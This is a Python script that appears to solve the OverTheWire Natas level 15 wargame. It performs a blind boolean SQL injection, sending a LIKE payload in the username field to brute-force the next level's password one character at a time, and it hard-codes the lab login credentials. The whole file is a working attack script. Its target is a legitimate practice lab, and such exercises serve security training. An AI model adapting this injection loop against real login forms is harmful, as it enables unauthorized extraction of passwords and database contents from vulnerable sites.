import requests
import string

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

user_name = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url = f"http://{user_name}.natas.labs.overthewire.org"

session = requests.Session()


seen_password = []
pass_found = False
while not pass_found:
    for ch in characters:
        print("Trying with password: ", "".join(seen_password) + ch)

        response = session.post(url, auth = (user_name, password), data={"username": 'natas16" AND BINARY password LIKE "'
                                                                        + "".join(seen_password) + ch + '%" #'})

        content = response.text

        if "user exists" in content:
            seen_password.append(ch)
            break

        if len(seen_password) > 31:
            print()
            print("PASSWORD FOUND! The password is: ", "".join(seen_password))
            pass_found = True
            break
